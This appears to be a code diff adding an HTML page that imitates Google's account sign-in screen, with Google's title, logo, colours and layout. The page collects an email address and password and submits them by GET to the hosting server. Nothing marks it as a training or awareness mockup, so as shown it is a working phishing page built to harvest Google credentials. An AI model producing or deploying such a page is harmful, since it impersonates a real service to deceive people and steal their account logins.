@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in - Google Accounts</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Roboto,Arial,sans-serif;background:#f0f4f9;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}
+.card{background:#fff;border:1px solid #dadce0;border-radius:28px;padding:40px 32px 32px;width:100%;max-width:400px}
+.logo{display:flex;align-items:center;gap:10px;margin-bottom:16px}
+.logo svg{width:28px;height:28px}
+.logo span{font-size:22px;color:#1f1f1f}
+h1{font-size:26px;font-weight:400;color:#1f1f1f}
+.sub{font-size:15px;color:#1f1f1f;margin-bottom:26px}
+.field{margin-bottom:18px}
+input{width:100%;font-size:16px;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;outline:none;color:#202124}
+input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
+.btn{width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px;font-size:15px;font-weight:500;cursor:pointer}
+.hint{font-size:13px;color:#5f6368;margin-top:20px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.5l6.8-6.8C35.8 2.6 30.3 0 24 0 14.6 0 6.6 5.5 2.7 13.5l7.9 6.1C12.5 13 17.8 9.5 24 9.5z"/><path fill="#4285F4" d="M46.6 24.6c0-1.6-.1-3.1-.4-4.6H24v9.3h12.7c-.5 2.9-2.2 5.4-4.7 7v5.8h7.6c4.4-4.1 7-10.1 7-17.5z"/><path fill="#FBBC05" d="M10.6 28.4c-.5-1.5-.8-3-.8-4.6s.3-3.1.8-4.6L2.7 13.1C1 16.5 0 20.2 0 24s1 7.5 2.7 10.9l7.9-6.5z"/><path fill="#34A853" d="M24 48c6.3 0 11.7-2.1 15.6-5.7l-7.6-5.8c-2.1 1.4-4.8 2.3-8 2.3-6.2 0-11.5-3.5-13.4-9.4l-7.9 6.1C6.6 42.5 14.6 48 24 48z"/></svg>
+    <span>Google</span>
+  </div>
+  <h1>Sign in</h1>
+  <div class="sub">Use your Google Account</div>
+  <form method="get" action="/">
+    <div class="field"><input type="email" name="email" placeholder="Email or phone" autocomplete="username" required></div>
+    <div class="field"><input type="password" name="password" placeholder="Enter your password" autocomplete="current-password" required></div>
+    <button class="btn" type="submit">Next</button>
+  </form>
+  <div class="hint">To continue, sign in with your account</div>
+</div>
+</body>
+</html>
